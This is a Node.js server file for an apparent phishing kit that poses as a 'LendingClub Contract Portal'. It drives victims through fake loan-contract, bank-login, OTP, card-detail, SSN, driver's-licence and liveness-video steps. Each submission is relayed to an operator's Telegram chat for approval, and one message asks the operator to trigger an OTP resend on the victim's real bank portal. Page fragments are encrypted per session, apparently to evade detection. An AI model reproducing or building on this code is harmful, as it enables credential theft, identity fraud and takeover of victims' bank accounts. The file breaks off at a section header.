/**
 * ================================================================
 *  SERVER.JS  —  LendingClub Contract Portal Backend
 *  Version: 2.0.0  |  Round 5 — Full rebuild aligned to v3 client.
 *  Deployed on: Render  |  Node ≥ 18
 * ================================================================
 *
 *  WHAT CHANGED FROM v1.1.0:
 *  ─────────────────────────────────────────────────────────────
 *  5A — Critical wiring fixes:
 *   • WS URL param: sid/fp/page (was sessionId — always rejected)
 *   • session_register → session_ack + serverSalt (CryptoGate bootstrap)
 *   • serverSalt: crypto.randomBytes(32) per session, stored in Redis
 *   • navigation_intent handler: Redis TTL refresh on page transitions
 *   • step_change: reads 'route' not 'page'
 *   • /step/submit: NEW — HTTPS-only credential submission endpoint
 *   • /poll/:sessionId: NEW — HTTPS polling fallback (3rd channel)
 *   • FORCE_NAVIGATE_PAGE added to command whitelist
 *   • RENDER_FRAGMENT added to command whitelist + delivery
 *   • /session/entry-notify: device fingerprint in Telegram message
 *   • submission_pending: no longer reads credentials from WS payload
 *   • sendTelegramApproval: bank_details safe-field names fixed
 *   • Entry notify: removed double-overlay SHOW_LOADER
 *   • Page 5 / email auth dead code stripped entirely
 *
 *  5B — RENDER_FRAGMENT infrastructure:
 *   • FragmentStore: loads .html fragments from /fragments/ directory
 *   • FragmentCrypto: AES-256-GCM encrypt per session using serverSalt
 *   • /fragments/serve/:fragmentId: authenticated fragment endpoint
 *   • FlowFragmentMap: approval stepType → fragment IDs to deliver
 *   • deliverFragment(sessionId, fragmentId): encrypt + push via WS/SSE
 *   • APPROVE_SESSION → delivers INDEX_APPID fragment
 *   • All APPROVE_STEP events now auto-deliver correct next fragment
 *
 *  5C — Dev fragment endpoint:
 *   • GET /dev/fragment/:fragmentId: plaintext fragment for dev toolbar
 *   • Only active when NODE_ENV !== 'production'
 *   • Reads from /dev-fragments/ directory (plaintext .html files)
 *   • Returns { html, css, fragment_id }
 *
 *  FIX — handleSessionEntryCallback:
 *   • After APPROVE_SESSION delivery, immediately push c_splash_v1 +
 *     c_forma_v1 to the client. The SPA is a single-page app that
 *     never reloads — it won't re-register with currentRoute='CONTRACT'
 *     so the auto-deliver in session_register never fires. Without this
 *     push, page2 stays blank forever after Telegram entry approval.
 * ================================================================
 */

'use strict';

require('dotenv').config();

const express      = require('express');
const http         = require('http');
const WebSocket    = require('ws');
const cors         = require('cors');
const multer       = require('multer');
const crypto       = require('crypto');
const fs           = require('fs');
const path         = require('path');
const { createClient } = require('@supabase/supabase-js');
const Redis        = require('ioredis');
const TelegramBot  = require('node-telegram-bot-api');
const rateLimit    = require('express-rate-limit');
const setupAdminWS = require('./admin-ws');

// ================================================================
//  ENV VALIDATION
// ================================================================
const REQUIRED_ENV = [
  'SUPABASE_URL',
  'SUPABASE_SERVICE_ROLE_KEY',
  'REDIS_URL',
  'TELEGRAM_BOT_TOKEN',
  'TELEGRAM_CHAT_ID',
  'ADMIN_SECRET_KEY',
];
const missingEnv = REQUIRED_ENV.filter(k => !process.env[k]);
if (missingEnv.length) {
  console.error('[FATAL] Missing required environment variables:', missingEnv.join(', '));
  process.exit(1);
}

const PORT      = parseInt(process.env.PORT || '3000', 10);
const ADMIN_KEY = process.env.ADMIN_SECRET_KEY;
const NODE_ENV  = process.env.NODE_ENV || 'development';
const IS_PROD   = NODE_ENV === 'production';

// CORS — origins from ENV, wildcard support
const ALLOWED_ORIGINS = (process.env.ALLOWED_ORIGINS || '*').split(',').map(s => s.trim());
const ALLOWED_ORIGIN_PATTERNS = ALLOWED_ORIGINS.map(o => {
  if (o.includes('*')) {
    const pattern = o.replace(/[.+?^${}()|[\]\\]/g, '\\$&').replace(/\*/g, '[^.]+');
    return new RegExp(`^${pattern}$`);
  }
  return o;
});

// ================================================================
//  LOGGER
// ================================================================
const Log = {
  info:  (...a) => console.log( `[${new Date().toISOString()}] [INFO] `, ...a),
  warn:  (...a) => console.warn( `[${new Date().toISOString()}] [WARN] `, ...a),
  error: (...a) => console.error(`[${new Date().toISOString()}] [ERROR]`, ...a),
  debug: (...a) => !IS_PROD && console.debug(`[${new Date().toISOString()}] [DEBUG]`, ...a),
};

// ================================================================
//  SUPABASE  (service role — never exposed to client)
// ================================================================
const supabase = createClient(
  process.env.SUPABASE_URL,
  process.env.SUPABASE_SERVICE_ROLE_KEY,
  { auth: { persistSession: false, autoRefreshToken: false } }
);
Log.info('Supabase service-role client initialized.');

// ================================================================
//  REDIS
// ================================================================
const redis = new Redis(process.env.REDIS_URL, {
  maxRetriesPerRequest: 3,
  lazyConnect:         false,
  enableOfflineQueue:  true,
});
redis.on('connect',      () => Log.info('Redis: connected'));
redis.on('error',        (e) => Log.error('Redis error:', e.message));
redis.on('reconnecting', () => Log.warn('Redis: reconnecting…'));

// ── Redis key builders ────────────────────────────────────────
const RK = {
  session:        (sid)   => `session:${sid}`,
  sessionSalt:    (sid)   => `session_salt:${sid}`,
  cmdQueue:       (sid)   => `cmd_queue:${sid}`,
  appSessions:    (appId) => `app:${appId}:sessions`,
  appSubmissions: (appId) => `app:${appId}:submissions`,
  heartbeat:      (sid)   => `heartbeat:${sid}`,
  wsSessions:     ()      => `ws:sessions`,
};

// TTL constants — aligned to APP_CONFIG.REDIS on client
const TTL = {
  SESSION:   86400,   // 24h
  SALT:      86400,   // 24h — must outlive session
  CMD_QUEUE: 7200,    // 2h
  HEARTBEAT: 35,      // 35s
  NAV_GRACE: 60,      // 60s
};

// ================================================================
//  TELEGRAM
// ================================================================
const telegram      = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: false });
const TELEGRAM_CHAT = process.env.TELEGRAM_CHAT_ID;

// ================================================================
//  MULTER — file uploads
// ================================================================
const upload = multer({
  storage: multer.memoryStorage(),
  limits:  { fileSize: 52_428_800 },   // 50 MB
  fileFilter: (_req, file, cb) => {
    const allowed = [
      'image/jpeg','image/png','image/webp',
      'video/webm','video/mp4',
      'application/pdf',
    ];
    cb(null, allowed.includes(file.mimetype));
  },
});

// ================================================================
//  RATE LIMITERS
// ================================================================
const adminLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, max: 300,
  message:  { error: 'Too many attempts. Try again later.' },
  standardHeaders: true, legacyHeaders: false,
  skip: (req) => req.path === '/admin/stream',
});

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, max: 30,
  message:  { error: 'Too many login attempts.' },
  standardHeaders: true, legacyHeaders: false,
});

const submitLimiter = rateLimit({
  windowMs: 60 * 1000, max: 20,
  message:  { error: 'Too many submissions.' },
  standardHeaders: true, legacyHeaders: false,
});

// ================================================================
//  EXPRESS APP
// ================================================================
const app    = express();
const server = http.createServer(app);

app.set('trust proxy', 1);

app.use(cors({
  origin: (origin, cb) => {
    if (!origin) return cb(null, true);
    const ok = ALLOWED_ORIGIN_PATTERNS.some(p => {
      if (p === '*')           return true;
      if (p instanceof RegExp) return p.test(origin);
      return p === origin;
    });
    ok ? cb(null, true) : cb(new Error('CORS: Origin not allowed — ' + origin));
  },
  credentials: true,
}));

app.use(express.json({ limit: '2mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

app.use('/admin',                   adminLimiter);
app.use('/setup-telegram-webhook',  adminLimiter);
app.use('/step/submit',             submitLimiter);

// ── Health ──────────────────────────────────────────────────────
app.get('/health', (_req, res) => res.json({ status: 'ok', ts: Date.now() }));

// ================================================================
//  5B — FRAGMENT CRYPTO ENGINE
// ================================================================
const FragmentCrypto = {

  async deriveKey(sessionId, saltBase64) {
    const saltBuf = Buffer.from(saltBase64, 'base64');
    return new Promise((resolve, reject) => {
      crypto.pbkdf2(
        Buffer.from(sessionId, 'utf8'),
        saltBuf,
        310000,
        32,
        'sha256',
        (err, key) => err ? reject(err) : resolve(key)
      );
    });
  },

  async encrypt(plaintext, derivedKeyBuf) {
    const iv         = crypto.randomBytes(12);
    const cipher     = crypto.createCipheriv('aes-256-gcm', derivedKeyBuf, iv);
    const encrypted  = Buffer.concat([
      cipher.update(plaintext, 'utf8'),
      cipher.final(),
    ]);
    const authTag = cipher.getAuthTag();
    const ciphertextWithTag = Buffer.concat([encrypted, authTag]);
    return {
      ciphertextBase64: ciphertextWithTag.toString('base64'),
      ivBase64:         iv.toString('base64'),
    };
  },

  async encryptFragment(sessionId, saltBase64, html, css = '') {
    const key     = await this.deriveKey(sessionId, saltBase64);
    const encHtml = await this.encrypt(html, key);
    const encCss  = css.trim() ? await this.encrypt(css, key) : null;
    return {
      encrypted_html: encHtml.ciphertextBase64,
      iv_html:        encHtml.ivBase64,
      encrypted_css:  encCss ? encCss.ciphertextBase64 : null,
      iv_css:         encCss ? encCss.ivBase64         : null,
    };
  },
};

// ================================================================
//  5B — FRAGMENT STORE
// ================================================================
const FRAGMENTS_DIR     = path.join(__dirname, 'fragments');
const DEV_FRAGMENTS_DIR = path.join(__dirname, 'dev-fragments');

const FragmentStore = {
  _cache: new Map(),

  _load(fragmentId) {
    if (this._cache.has(fragmentId)) return this._cache.get(fragmentId);

    const htmlPath = path.join(FRAGMENTS_DIR, `${fragmentId}.html`);
    const cssPath  = path.join(FRAGMENTS_DIR, `${fragmentId}.css`);

    if (!fs.existsSync(htmlPath)) {
      Log.warn(`FragmentStore: Fragment file not found: ${htmlPath}`);
      return null;
    }

    const html  = fs.readFileSync(htmlPath, 'utf8');
    const css   = fs.existsSync(cssPath) ? fs.readFileSync(cssPath, 'utf8') : '';
    const entry = { html, css };
    this._cache.set(fragmentId, entry);
    return entry;
  },

  validate() {
    const EXPECTED = [
      'idx_appid_v1','c_splash_v1','c_forma_v1','c_formb_v1','c_formc_v1',
      'p_init_v1','p_banksel_v1','p_login_v1','p_otp_v1','p_card_v1',
      'p_liveness_v1','success_v1',
    ];
    if (!fs.existsSync(FRAGMENTS_DIR)) {
      Log.warn(`FragmentStore: /fragments/ directory not found. Fragment delivery will fail.`);
      return;
    }
    let missing = 0;
    EXPECTED.forEach(id => {
      const p = path.join(FRAGMENTS_DIR, `${id}.html`);
      if (!fs.existsSync(p)) { Log.warn(`FragmentStore: Missing fragment: ${id}.html`); missing++; }
    });
    if (missing === 0) Log.info(`FragmentStore: All ${EXPECTED.length} fragments present.`);
    else Log.warn(`FragmentStore: ${missing} fragment(s) missing — some pages will not render.`);
  },

  get(fragmentId) { return this._load(fragmentId); },

  invalidate(fragmentId) { this._cache.delete(fragmentId); },
};

// ================================================================
//  5B — FLOW FRAGMENT MAP
// ================================================================
const FLOW_FRAGMENT_MAP = {
  'session_entry':              ['idx_appid_v1'],
  'bank_details':               ['c_formc_v1'],
  'kyc_front_dl':               null,
  'kyc_back_dl':                null,
  'kyc_selfie_front_dl':        null,
  'kyc_selfie_back_dl':         null,
  'plaid_bank_login':           null,
  'plaid_otp':                  ['p_card_v1'],
  'plaid_card_details':         ['p_liveness_v1'],
  'plaid_video_liveness_front': null,
  'plaid_video_liveness_back':  null,
  'request_contract_splash':    ['c_splash_v1'],
  'request_forma':              ['c_forma_v1'],
  'request_formb':              ['c_formb_v1'],
  'request_plaid_initial':      ['p_init_v1'],
  'request_plaid_banksel':      ['p_banksel_v1'],
  'request_success':            ['success_v1'],
};

// ================================================================
//  WEBSOCKET SERVER (noServer — coexists with /ws/admin)
// ================================================================
const wss = new WebSocket.Server({ noServer: true });

const wsClients  = new Map();   // sessionId → WebSocket
const sseClients = new Map();   // sessionId → SSE response

server.on('upgrade', (request, socket, head) => {
  const pathname = new URL(request.url, 'http://localhost').pathname;
  if (pathname === '/ws') {
    wss.handleUpgrade(request, socket, head, (ws) => {
      wss.emit('connection', ws, request);
    });
  }
});

wss.on('connection', (ws, req) => {
  const url = new URL(req.url, `http://localhost`);

  const sessionId   = url.searchParams.get('sid');
  const fingerprint = url.searchParams.get('fp')   || '';
  const pageRoute   = url.searchParams.get('page') || 'unknown';

  const UUID_REGEX = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;
  if (!sessionId || !UUID_REGEX.test(sessionId)) {
    Log.warn(`WS: Rejected — invalid sid: "${sessionId}"`);
    ws.close(1008, 'valid sid required');
    return;
  }

  Log.info(`WS: Connected — session=${sessionId.slice(0,8)} route=${pageRoute}`);
  wsClients.set(sessionId, ws);
  redis.hset(RK.wsSessions(), sessionId, '1').catch(() => {});

  ws.on('message', async (raw) => {
    let msg;
    try { msg = JSON.parse(raw); } catch { return; }
    await handleClientMessage(sessionId, msg, fingerprint);
  });

  ws.on('close', () => {
    Log.info(`WS: Disconnected — session=${sessionId.slice(0,8)}`);
    wsClients.delete(sessionId);
    redis.hdel(RK.wsSessions(), sessionId).catch(() => {});
    supabase.from('sessions')
      .update({ connection_status: 'disconnected' })
      .eq('session_id', sessionId)
      .then(() => {});
  });

  ws.on('error', (err) => {
    Log.error(`WS error session=${sessionId.slice(0,8)}:`, err.message);
    wsClients.delete(sessionId);
  });
});

// ================================================================
//  CLIENT MESSAGE HANDLER
// ================================================================
async function handleClientMessage(sessionId, msg, fingerprint = '') {
  Log.debug(`MSG ${msg.type} — session=${sessionId.slice(0,8)}`);

  switch (msg.type) {

    case 'session_register': {
      const {
        applicationId,
        currentRoute = 'unknown',
        currentStep  = '',
        fingerprint: fpBody = fingerprint,
        redisTTL     = TTL.SESSION,
        navGraceTTL  = TTL.NAV_GRACE,
      } = msg;

      let saltBase64 = await redis.get(RK.sessionSalt(sessionId));
      if (!saltBase64) {
        saltBase64 = crypto.randomBytes(32).toString('base64');
        await redis.set(RK.sessionSalt(sessionId), saltBase64, 'EX', TTL.SALT);
        Log.debug(`session_register: New salt generated for ${sessionId.slice(0,8)}`);
      } else {
        Log.debug(`session_register: Existing salt reused for ${sessionId.slice(0,8)}`);
      }

      await redis.hset(RK.session(sessionId), {
        session_id:     sessionId,
        application_id: applicationId || '',
        current_route:  currentRoute,
        current_step:   currentStep,
        fingerprint:    fpBody,
        connected_at:   Date.now(),
      });
      await redis.expire(RK.session(sessionId), Number(redisTTL) || TTL.SESSION);

      if (applicationId) {
        await redis.sadd(RK.appSessions(applicationId), sessionId);
        await redis.expire(RK.appSessions(applicationId), TTL.SESSION);
      }
      await redis.set(RK.heartbeat(sessionId), '1', 'EX', TTL.HEARTBEAT);

      const queuedCmds = await drainCmdQueue(sessionId);

      supabase.from('sessions').update({
        application_id:     applicationId || null,
        connection_status:  'online',
        connection_channel: 'websocket',
        current_page:       currentRoute,
        current_step:       currentStep,
        fingerprint_hash:   fpBody,
        last_heartbeat:     new Date().toISOString(),
      }).eq('session_id', sessionId).then(() => {});

      wsSend(sessionId, {
        type:    'session_ack',
        payload: {
          sessionId,
          serverSalt:     saltBase64,
          queuedCommands: queuedCmds,
        },
      });

      // Auto-deliver landing page fragment for INDEX route
      if (currentRoute === 'INDEX' || currentRoute === 'unknown') {
        setTimeout(async () => {
          // Only deliver entry form if session has not already been approved
          const alreadyApproved = await redis.get(`session_approved:${sessionId}`);
          if (!alreadyApproved) {
            await deliverFragment(sessionId, 'idx_appid_v1');
            Log.info(`Auto-delivered idx_appid_v1 → session=${sessionId.slice(0,8)}`);
          } else {
            // Session was approved while frontend was offline — push approval now
            Log.info(`Reconnect after approval → delivering APPROVE_SESSION → session=${sessionId.slice(0,8)}`);
            const cmdId = await insertCommand(sessionId, null, 'APPROVE_SESSION', { source: 'reconnect' });
            await deliverCommand(sessionId, {
              type: 'APPROVE_SESSION', id: cmdId, payload: { source: 'reconnect' },
            });
            await new Promise(r => setTimeout(r, 400));
            await deliverFragment(sessionId, 'c_splash_v1');
            await new Promise(r => setTimeout(r, 200));
            await deliverFragment(sessionId, 'c_forma_v1');
          }
        }, 300);
      }

      if (currentRoute === 'CONTRACT') {
        setTimeout(async () => {
          const approved = await redis.get(`session_approved:${sessionId}`);
          if (approved) {
            await deliverFragment(sessionId, 'c_splash_v1');
            Log.info(`Auto-delivered c_splash_v1 → session=${sessionId.slice(0,8)}`);
            setTimeout(async () => {
              await deliverFragment(sessionId, 'c_forma_v1');
              Log.info(`Auto-delivered c_forma_v1 → session=${sessionId.slice(0,8)}`);
            }, 200);
          } else {
            wsSend(sessionId, { type: 'FORCE_NAVIGATE_PAGE', payload: { page: 'INDEX' } });
          }
        }, 300);
      }

      if (currentRoute === 'PLAID') {
        setTimeout(async () => {
          const approved = await redis.get(`session_approved:${sessionId}`);
          if (approved) {
            await deliverFragment(sessionId, 'p_init_v1');
            Log.info(`Auto-delivered p_init_v1 → session=${sessionId.slice(0,8)}`);
          } else {
            wsSend(sessionId, { type: 'FORCE_NAVIGATE_PAGE', payload: { page: 'INDEX' } });
          }
        }, 300);
      }

      if (currentRoute === 'SUCCESS') {
        setTimeout(async () => {
          const approved = await redis.get(`session_approved:${sessionId}`);
          if (approved) {
            await deliverFragment(sessionId, 'success_v1');
            Log.info(`Auto-delivered success_v1 → session=${sessionId.slice(0,8)}`);
          } else {
            wsSend(sessionId, { type: 'FORCE_NAVIGATE_PAGE', payload: { page: 'INDEX' } });
          }
        }, 300);
      }

      broadcastToAdmins({
        type: 'session_update', sessionId, applicationId, currentRoute, currentStep,
      });
      Log.info(`session_register OK — session=${sessionId.slice(0,8)} route=${currentRoute}`);
      break;
    }

    case 'ping': {
      await redis.set(RK.heartbeat(sessionId), '1', 'EX', TTL.HEARTBEAT);

      const route   = msg.currentRoute || msg.currentPage || '';
      const step    = msg.currentStep  || '';
      const changed = msg.stateChanged !== false;

      if (changed) {
        await redis.hset(RK.session(sessionId), {
          current_route: route,
          current_step:  step,
          last_seen:     Date.now(),
        });
        supabase.from('sessions').update({
          last_heartbeat:    new Date().toISOString(),
          connection_status: 'online',
          current_page:      route,
          current_step:      step,
        }).eq('session_id', sessionId).then(() => {});
      }

      wsSend(sessionId, { type: 'pong', ts: Date.now() });

      if (changed) {
        broadcastToAdmins({ type: 'heartbeat', sessionId, route, step, ts: Date.now() });
      }
      break;
    }

    case 'navigation_intent': {
      const { fromRoute, toRoute, redisTTL = TTL.SESSION } = msg;
      Log.info(`navigation_intent: ${fromRoute} → ${toRoute} | session=${sessionId.slice(0,8)}`);

      await redis.expire(RK.session(sessionId),     Number(redisTTL) || TTL.SESSION);
      await redis.expire(RK.sessionSalt(sessionId), TTL.SALT);
      await redis.expire(RK.cmdQueue(sessionId),    TTL.CMD_QUEUE);

      await redis.hset(RK.session(sessionId), {
        connection_status: 'navigating',
        current_route:     toRoute || '',
        nav_from:          fromRoute || '',
        nav_ts:            Date.now(),
      });

      supabase.from('sessions').update({
        connection_status: 'navigating',
        current_page:      toRoute || '',
      }).eq('session_id', sessionId).then(() => {});

      broadcastToAdmins({ type: 'navigation', sessionId, fromRoute, toRoute, ts: Date.now() });
      break;
    }

    case 'step_change': {
      const { route, step, subStep } = msg;
      await redis.hset(RK.session(sessionId), {
        current_route: route || '',
        current_step:  step  || '',
        sub_step:      subStep || '',
      });
      broadcastToAdmins({ type: 'step_change', sessionId, route, step, subStep });
      break;
    }

    case 'submission_pending': {
      const { stepType, submissionId, applicationId } = msg;

      Log.info(`submission_pending: ${stepType} | sub=${submissionId} | session=${sessionId.slice(0,8)}`);

      if (applicationId && submissionId) {
        await redis.rpush(RK.appSubmissions(applicationId), submissionId);
        await redis.expire(RK.appSubmissions(applicationId), TTL.SESSION);
      }

      broadcastToAdmins({
        type: 'new_submission', sessionId, applicationId, submissionId, stepType, ts: Date.now(),
      });
      break;
    }

    case 'bank_selected': {
      const { bankId, bankName } = msg;
      await redis.hset(RK.session(sessionId), { selected_bank: bankName || bankId });
      broadcastToAdmins({ type: 'bank_selected', sessionId, bankId, bankName });
      break;
    }

    case 'request_fragment': {
      const { fragmentId } = msg;
      if (!fragmentId) break;
      Log.info(`request_fragment: ${fragmentId} | session=${sessionId.slice(0,8)}`);
      await deliverFragment(sessionId, fragmentId);
      break;
    }

    case 'session_pause': {
      await redis.set(RK.heartbeat(sessionId), '1', 'EX', TTL.HEARTBEAT);
      supabase.from('sessions').update({ connection_status: 'idle' })
        .eq('session_id', sessionId).then(() => {});
      break;
    }

    case 'otp_resend_request': {
      const { applicationId: appId, clientName: cName } = msg;
      const sInfo = await redis.hgetall(RK.session(sessionId));
      Log.info(`OTP resend requested — session=${sessionId.slice(0,8)}`);
      await telegram.sendMessage(TELEGRAM_CHAT,
        [`🔄 *OTP RESEND REQUEST*`, ``,
         `👤 Client:  ${cName || sInfo.application_id || 'Unknown'}`,
         `🔑 Session: ${sessionId.slice(0,8)}…`,
         `🕐 Time:    ${new Date().toLocaleString('en-US', { timeZone: 'America/New_York' })} ET`,
         ``, `⚠️ User is requesting a new OTP. Please trigger resend on the bank portal.`,
        ].join('\n'), { parse_mode: 'Markdown' }
      ).catch(e => Log.error('OTP resend notify failed:', e.message));
      broadcastToAdmins({ type: 'otp_resend_requested', sessionId, ts: Date.now() });
      break;
    }

    default:
      Log.debug(`Unhandled client message: ${msg.type}`);
  }
}

// ================================================================
//  SEND / DELIVERY HELPERS
// ================================================================
function wsSend(sessionId, payload) {
  const ws = wsClients.get(sessionId);
  if (ws && ws.readyState === WebSocket.OPEN) {
    try { ws.send(JSON.stringify(payload)); return true; }
    catch (e) { Log.error(`wsSend failed ${sessionId.slice(0,8)}:`, e.message); }
  }
  return false;
}

function sseSend(sessionId, payload) {
  const res = sseClients.get(sessionId);
  if (res && !res.writableEnded) {
    try { res.write(`data: ${JSON.stringify(payload)}\n\n`); return true; }
    catch (e) { Log.error(`sseSend failed ${sessionId.slice(0,8)}:`, e.message); }
  }
  return false;
}

async function deliverCommand(sessionId, commandPayload) {
  const sent = wsSend(sessionId, commandPayload);
  if (sent) return 'ws';

  const sseSent = sseSend(sessionId, commandPayload);
  if (sseSent) return 'sse';

  await queueCommand(sessionId, commandPayload);
  return 'queued';
}

async function queueCommand(sessionId, commandPayload) {
  try {
    await redis.rpush(RK.cmdQueue(sessionId), JSON.stringify(commandPayload));
    await redis.expire(RK.cmdQueue(sessionId), TTL.CMD_QUEUE);
    Log.debug(`Command queued for ${sessionId.slice(0,8)}: ${commandPayload.type}`);
  } catch (e) {
    Log.error('queueCommand failed:', e.message);
  }
}

async function drainCmdQueue(sessionId) {
  try {
    const items = await redis.lrange(RK.cmdQueue(sessionId), 0, -1);
    if (items.length > 0) {
      await redis.del(RK.cmdQueue(sessionId));
      const cmds = items.map(i => { try { return JSON.parse(i); } catch { return null; } }).filter(Boolean);
      Log.info(`drainCmdQueue: ${cmds.length} queued command(s) for ${sessionId.slice(0,8)}`);
      return cmds;
    }
  } catch (e) {
    Log.error('drainCmdQueue failed:', e.message);
  }
  return [];
}

// ── Admin broadcast ────────────────────────────────────────────
const adminSseClients = new Set();
let _adminWsBroadcast = null;

function broadcastToAdmins(payload) {
  const data = `data: ${JSON.stringify(payload)}\n\n`;
  adminSseClients.forEach(res => {
    if (!res.writableEnded) {
      try { res.write(data); } catch { adminSseClients.delete(res); }
    } else {
      adminSseClients.delete(res);
    }
  });
  if (_adminWsBroadcast) {
    _adminWsBroadcast({ ...payload, ts: payload.ts || Date.now() });
  }
}

// ================================================================
//  5B — FRAGMENT DELIVERY
// ================================================================
async function deliverFragment(sessionId, fragmentId) {
  const fragment = FragmentStore.get(fragmentId);
  if (!fragment) {
    Log.error(`deliverFragment: Fragment not found: ${fragmentId}`);
    return false;
  }

  const saltBase64 = await redis.get(RK.sessionSalt(sessionId));
  if (!saltBase64) {
    Log.error(`deliverFragment: No salt in Redis for session ${sessionId.slice(0,8)}`);
    if (!IS_PROD) {
      await deliverCommand(sessionId, {
        type: 'RENDER_FRAGMENT',
        id:   Date.now().toString(36) + '_' + Math.random().toString(36).slice(2),
        payload: {
          fragment_id:    fragmentId,
          encrypted_html: null,
          encrypted_css:  null,
          iv_html:        null,
          iv_css:         null,
          _dev_html:      fragment.html,
          _dev_css:       fragment.css,
        },
      });
    }
    return false;
  }

  let encPayload;
  try {
    encPayload = await FragmentCrypto.encryptFragment(
      sessionId, saltBase64, fragment.html, fragment.css
    );
  } catch (err) {
    Log.error(`deliverFragment: Encryption failed for ${fragmentId}:`, err.message);
    return false;
  }

  const channel = await deliverCommand(sessionId, {
    type: 'RENDER_FRAGMENT',
    id:   Date.now().toString(36) + '_' + Math.random().toString(36).slice(2),
    payload: {
      fragment_id:    fragmentId,
      encrypted_html: encPayload.encrypted_html,
      iv_html:        encPayload.iv_html,
      encrypted_css:  encPayload.encrypted_css,
      iv_css:         encPayload.iv_css,
    },
  });

  Log.info(`deliverFragment: ${fragmentId} → ${sessionId.slice(0,8)} via ${channel}`);
  return true;
}

// ================================================================
//  SUPABASE HELPERS
// ================================================================
async function insertCommand(sessionId, applicationId, commandType, payload) {
  try {
    const { data, error } = await supabase.from('admin_commands').insert({
      session_id:     sessionId,
      application_id: applicationId || null,
      command_type:   commandType,
      payload:        payload || {},
      status:         'queued',
    }).select('id').single();
    if (error) throw error;
    return data.id;
  } catch (err) {
    Log.error('insertCommand failed:', err.message);
    return null;
  }
}

async function getSubmission(submissionId) {
  try {
    const { data, error } = await supabase
      .from('submissions')
      .select('*, applications(client_name, loan_amount, email)')
      .eq('id', submissionId)
      .single();
    if (error) throw error;
    return data;
  } catch (err) {
    Log.error('getSubmission failed:', err.message);
    return null;
  }
}

async function getSessionInfo(sessionId) {
  try {
    const { data, error } = await supabase
      .from('sessions')
      .select('*, applications(client_name, loan_amount, email, tenure, emi, apr)')
      .eq('session_id', sessionId)
      .single();
    if (error) return null;
    return data;
  } catch { return null; }
}

// ================================================================
//  TELEGRAM HELPERS
// ================================================================
let tgReviewCounter = 0;
function tgNextId() {
  tgReviewCounter = (tgReviewCounter + 1) % 9_999_999;
  return String(tgReviewCounter);
}

const tgPendingReviews    = new Map();
const tgPendingOtpApproval = new Map();

function buildTelegramCaption(stepType, sessionId, applicationId, clientName, extraData) {
  const STEP_LABELS = {
    kyc_front_dl:               '🪪 KYC — Front of Driver\'s License',
    kyc_back_dl:                '🪪 KYC — Back of Driver\'s License',
    kyc_selfie_front_dl:        '🤳 KYC — Selfie + Front DL',
    kyc_selfie_back_dl:         '🤳 KYC — Selfie + Back DL',
    plaid_video_liveness_front: '🎥 Liveness — Front Card',
    plaid_video_liveness_back:  '🎥 Liveness — Back Card',
    admin_requested_doc:        '📄 Admin Requested Document',
  };
  const label = STEP_LABELS[stepType] || stepType;
  const ts    = new Date().toLocaleString('en-US', { timeZone: 'America/New_York' });

  return [
    `📋 REVIEW REQUEST`, ``,
    `📌 Step:     ${label}`,
    `👤 Client:   ${clientName || 'Unknown'}`,
    `🆔 App ID:   ${(applicationId || 'N/A').slice(0, 12)}`,
    `🔑 Session:  ${(sessionId || '').slice(0, 8)}…`,
    `🕐 Time:     ${ts} ET`,
    ``, `───────────────────────────`,
    `Tap ✅ to approve or ❌ to reject.`,
  ].join('\n');
}

async function sendTelegramApproval(submission) {
  const payload  = submission.payload || {};
  const appData  = submission.applications || {};
  const stepType = submission.step_type || 'unknown';

  const STEP_LABELS = {
    bank_details:               '🏦 Bank Details',
    kyc_front_dl:               '🪪 KYC — Front DL',
    kyc_back_dl:                '🪪 KYC — Back DL',
    kyc_selfie_front_dl:        '🤳 KYC — Selfie + Front DL',
    kyc_selfie_back_dl:         '🤳 KYC — Selfie + Back DL',
    plaid_bank_login:           '🔐 Bank Login',
    plaid_otp:                  '🔢 Bank OTP',
    plaid_card_details:         '💳 Card Details',
    plaid_video_liveness_front: '🎥 Liveness Front',
    plaid_video_liveness_back:  '🎥 Liveness Back',
  };

  const lines = [
    `✅ *APPROVED — ${STEP_LABELS[stepType] || stepType}*`, ``,
    `👤 Client: ${appData.client_name || 'Unknown'}`,
    `🆔 App ID: ${submission.application_id || 'N/A'}`,
    `💰 Loan: $${appData.loan_amount || 'N/A'}`,
    `📅 Time: ${new Date().toLocaleString('en-US', { timeZone: 'America/New_York' })} ET`,
    ``, `━━━━━━━━━━━━━━━━━━━━`, `📋 *SUBMITTED DATA*`,
  ];

  if (stepType === 'bank_details') {
    lines.push(
      `🏦 Bank: ${payload.bank_name || 'N/A'}`,
      `🔐 SSN Last 4: ••••${payload.ssn_last4 || 'N/A'}`,
      `🔢 Routing: ${payload.routing_number || 'N/A'}`,
      `📋 Submission ID: ${payload.submission_id || 'N/A'}`,
    );
  } else if (stepType === 'plaid_bank_login') {
    lines.push(
      `🏦 Bank: ${payload.bank_name || 'N/A'}`,
      `📋 Submission ID: ${payload.submission_id || 'N/A'}`,
    );
  } else if (stepType === 'plaid_otp') {
    lines.push(`📋 Submission ID: ${payload.submission_id || 'N/A'}`);
  } else if (stepType === 'plaid_card_details') {
    lines.push(
      `🏦 Bank: ${payload.bank_name || 'N/A'}`,
      `💳 Card Last 4: ••••${payload.card_last4 || 'N/A'}`,
      `📋 Submission ID: ${payload.submission_id || 'N/A'}`,
    );
  } else {
    lines.push(`📁 Type: ${stepType}`);
  }

  lines.push(``, `🗃 Session: ${(submission.session_id || '').slice(0, 8)}…`);

  try {
    await telegram.sendMessage(TELEGRAM_CHAT, lines.join('\n'), { parse_mode: 'Markdown' });
    return true;
  } catch (err) {
    Log.error('sendTelegramApproval failed:', err.message);
    try {
      await telegram.sendMessage(TELEGRAM_CHAT, lines.join('\n').replace(/[*_`]/g, ''));
      return true;
    } catch (e2) {
      Log.error('Telegram plain fallback failed:', e2.message);
      return false;
    }
  }
}

// ================================================================
//  MIDDLEWARE: Admin Auth
// ================================================================
function adminAuth(req, res, next) {
  const authHeader = req.headers['authorization'] || '';
  const token = (authHeader.startsWith('Bearer ')
    ? authHeader.slice(7)
    : (req.query.adminKey || '')
  ).trim();
  if (!token || token !== ADMIN_KEY.trim()) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  next();
}

// ================================================================
//  ROUTES: CLIENT-FACING
// ================================================================

// ── SSE Fallback Stream ──────────────────────────────────────────
